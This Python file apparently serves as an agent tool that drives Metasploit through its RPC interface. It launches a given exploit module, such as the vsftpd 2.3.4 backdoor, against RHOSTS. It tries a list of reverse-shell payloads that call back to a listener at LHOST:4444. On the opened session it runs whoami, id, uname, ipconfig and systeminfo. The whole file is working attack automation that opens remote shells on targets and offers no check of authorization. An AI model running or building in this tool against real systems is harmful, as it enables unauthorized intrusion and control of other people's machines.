import os, json, time
from dotenv import load_dotenv
load_dotenv()

def detect_os(options: dict) -> str:
    """Try to detect OS from nmap scan data passed in options."""
    os_hint = options.pop('_os_hint', '').lower()
    if 'windows' in os_hint:
        return 'windows'
    return 'linux'

def parse_and_run(json_input: str) -> str:
    """
    Run a Metasploit exploit module.
    Input: JSON like {"module": "exploit/unix/ftp/vsftpd_234_backdoor",
                      "options": {"RHOSTS": "192.168.1.10"},
                      "_os_hint": "linux"}
    """
    try:
        from pymetasploit3.msfrpc import MsfRpcClient

        client = MsfRpcClient(
            os.getenv('MSF_PASSWORD'),
            server=os.getenv('MSF_HOST', '127.0.0.1'),
            port=int(os.getenv('MSF_PORT', 55553)),
            ssl=False
        )

        data = json.loads(json_input)
        module_path = data['module']
        options = data.get('options', {})
        os_hint = data.get('_os_hint', '')

        target_os = 'windows' if 'windows' in os_hint.lower() else 'linux'

        lhost = os.getenv('LHOST', '192.168.211.129')
        lport = os.getenv('LPORT', '4444')

        # Pick payloads based on target OS
        if target_os == 'windows':
            payloads_to_try = [
                'windows/x64/meterpreter/reverse_tcp',
                'windows/meterpreter/reverse_tcp',
                'windows/x64/shell_reverse_tcp',
                'windows/shell_reverse_tcp',
            ]
        else:
            payloads_to_try = [
                'cmd/unix/reverse',
                'cmd/unix/reverse_bash',
                'cmd/unix/reverse_perl',
                'cmd/unix/interact',
            ]

        for payload in payloads_to_try:
            try:
                exploit = client.modules.use('exploit', module_path)
                for k, v in options.items():
                    exploit[k] = v

                result = exploit.execute(
                    payload=payload,
                    LHOST=lhost,
                    LPORT=lport
                )

                if result.get('job_id') is not None:
                    job_id = result['job_id']
                    time.sleep(8)
                    sessions = client.sessions.list

                    if sessions:
                        sid = list(sessions.keys())[-1]
                        shell = client.sessions.session(sid)

                        if target_os == 'windows':
                            shell.write('whoami\r\n')
                            time.sleep(2)
                            output = shell.read()
                            shell.write('ipconfig\r\n')
                            time.sleep(2)
                            output += shell.read()
                            shell.write('systeminfo | findstr /B /C:"OS Name"\r\n')
                            time.sleep(2)
                            output += shell.read()
                        else:
                            shell.write('id\n')
                            time.sleep(2)
                            output = shell.read()
                            shell.write('whoami\n')
                            time.sleep(1)
                            output += shell.read()
                            shell.write('uname -a\n')
                            time.sleep(1)
                            output += shell.read()

                        return f"[+] EXPLOITED with {payload}! Job {job_id}\nOS: {target_os}\nOutput:\n{output}"
                    else:
                        return f"[+] Exploit fired (job {job_id}) with {payload} — no session yet. Target may need more time."

            except Exception as e:
                if any(x in str(e).lower() for x in ['invalid payload', 'invalid-target', 'no encoder']):
                    continue
                return f"Exploit error with {payload}: {e}"

        return f"[-] All {target_os} payload types failed for this module."

    except Exception as e:
        return f"Metasploit connection error: {e}"
